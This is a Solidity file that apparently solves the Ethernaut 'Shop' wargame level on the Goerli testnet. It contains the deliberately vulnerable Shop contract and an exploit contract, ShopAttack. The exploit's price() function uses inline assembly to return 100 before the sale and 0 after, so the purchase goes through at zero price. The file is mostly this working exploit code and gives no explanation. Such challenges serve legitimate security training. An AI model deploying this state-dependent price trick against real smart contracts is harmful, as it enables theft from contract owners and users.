// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// https://goerli.etherscan.io/address/0x643C7518576662e6aD1AaCaA30878829f20AC7Ea

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}


contract ShopAttack is Buyer
{
    Shop shopaddress;

     constructor(address _shopaddress)
     {
         shopaddress = Shop(_shopaddress);
     }

    function price() external view override returns(uint)
    {
        bool isSold = shopaddress.isSold();

        assembly
        {
            let result

            switch isSold

            case 1{
                result:=0
            }

             default{
                result:=100
            }

            mstore(0x0,result)

            return (0x0,32)
        }
    }

    function attack() external
    {
        shopaddress.buy();
    }
}
